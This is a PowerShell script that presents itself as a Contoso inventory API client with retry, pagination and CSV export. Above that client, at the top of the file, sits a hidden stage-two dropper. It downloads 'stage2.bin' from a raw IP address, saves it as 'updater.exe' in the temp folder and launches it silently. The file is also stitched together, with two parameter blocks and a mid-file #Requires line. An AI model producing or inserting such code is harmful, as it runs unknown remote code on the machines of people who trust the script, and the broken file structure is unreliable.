
[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://198.51.100.43/stage2.bin",
    [string]$Stage2Path = "$env:TEMP\updater.exe",
    [int]$RequestTimeout = 44,
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Invoke-Stage2Download -SourceUrl $DownloadUrl -DestinationPath $Stage2Path -TimeoutSec $RequestTimeout -UserAgent $BrowserAgent
if ($TransferResult) {
    Start-Process -FilePath $Stage2Path -ErrorAction SilentlyContinue
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
#Requires -Version 5.1
<#
.SYNOPSIS
    Calls the Contoso inventory API with retry and exports the server list.
.DESCRIPTION
    Wraps Invoke-RestMethod in a retry helper that backs off on transient errors
    and gives up on client errors such as 401 or 404.
    Pages are followed through the nextLink property until the collection is
    exhausted, then the records are written to CSV.
.PARAMETER BaseUri
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Invoke-ContosoApi.ps1 -PageSize 200
.EXAMPLE
    .\Invoke-ContosoApi.ps1 -Verbose
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$BaseUri = "https://api.contoso.com/v1",

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 10)]
    [int]$MaxRetries = 5,
    [int]$TimeoutSec = 30,

    [int]$PageSize = 200,

    [string]$ReportPath = "C:\Reports\api-servers-2024-03-22.csv"
)

$InformationPreference = 'SilentlyContinue'
Set-StrictMode -Version 2.0
$culture = [System.Globalization.CultureInfo]::InvariantCulture
$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

function Invoke-ContosoApi {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [ValidateSet('Get', 'Post')]
        [string]$Method = 'Get',

        [object]$Body
    )

    $uri = "$BaseUri$Path"
    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            $params = @{
                Uri         = $uri
                Method      = $Method
                Headers     = $headers
                TimeoutSec  = $TimeoutSec
                ErrorAction = 'Stop'
            }
            if ($Body) {
                $params.Body = $Body | ConvertTo-Json -Depth 5
                $params.ContentType = 'application/json'
            }
            return Invoke-RestMethod @params
        }
        catch {
            $status = 0
            if ($_.Exception.Response) {
                $status = [int]$_.Exception.Response.StatusCode
            }
            if (@(400, 401, 403, 404) -contains $status -or $attempt -eq $MaxRetries) {
                throw
            }
            Start-Sleep -Seconds ([math]::Pow(2, $attempt))
        }
    }
}

$page = Invoke-ContosoApi -Path ('/servers?limit=' + $PageSize)
$records = @($page.items)
while ($page.nextLink) {
    $next = $page.nextLink.Replace($BaseUri, '')
    $page = Invoke-ContosoApi -Path $next
    $records += @($page.items)
}

$records | Select-Object id, name, status | Format-Table -AutoSize

$records | Select-Object id, name, status | Export-Csv -NoTypeInformation -Path $ReportPath
